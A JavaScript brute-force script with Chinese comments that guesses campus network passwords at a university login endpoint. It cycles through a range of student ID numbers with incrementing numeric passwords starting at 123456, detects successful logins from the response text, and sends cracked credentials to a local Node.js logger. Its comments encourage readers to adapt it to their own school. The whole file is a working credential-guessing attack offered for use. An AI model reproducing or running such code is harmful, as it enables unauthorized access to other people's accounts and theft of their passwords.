// http://bkjw.hfut.edu.cn/student/photo/2012/201221xxxx.JPG
var prop = {};
// 校园网登陆请求发送的url地址
prop.url = "http://172.16.200.11/";
// 我们初始从这个学号开始
prop.name = 2012210000;
// 我们初始尝试 这个123456 密码, 据统计这个密码在本校2012级5500人中,有26人使用,频率非常高.
prop.passid = 123456;
prop.type = 'POST';
prop.timeout = 1000/24;
prop.save = function (str) {
    // 这个函数是与nodejs交互的模块,把抓取到的密码通过发送一个http请求,然后被nodejs脚本保存到文件中
    var url = "http://127.0.0.1:520/?" + str;
    document.body.innerHTML += "<img src='" + url + "'>";
}
prop.tryNext = function () {
    prop.name += 1;
    if (prop.name > 2012215000) {
        prop.name = 2012210000; // 学号初始化
        prop.passid += 1;       // 密码加1,开始尝试下一个密码
    }
    // 请求字符串,每个学校的该参数不同,要换成你自己学校的请求字段
    prop.str = "DDDDD=" + prop.name +"&upass=" + prop.passid + "&0MKKey=%B5%C7+%C2%BC";
    prop.ajax();
}
prop.success = function (back, str) {
	if (prop.timeout > 0) {
        setTimeout(function () {
        if (back.indexOf('您已经成功登录') !== -1) {
            console.log("密码正确");
            prop.save(str);
        }
        prop.tryNext();
        }, prop.timeout);
    } else {
        if (back.indexOf('您已经成功登录') !== -1) {
            console.log("密码正确");
            prop.save(str);
        }
        prop.tryNext();
    }
}
prop.ajax = function () {
    var xmlhttp = new XMLHttpRequest(),
        str = (prop.str + '').replace('&0MKKey=%B5%C7+%C2%BC', '');
    xmlhttp.onreadystatechange = function (){
        if (xmlhttp.readyState === 4){
            if (xmlhttp.status >= 200 && xmlhttp.status < 300) {
                prop.success(xmlhttp.responseText, str);
            }
        }
    }
    xmlhttp.open(prop.type, prop.url, true);
    xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=utf-8")
    xmlhttp.send(prop.str);
}
// 开始喽~~
prop.tryNext();
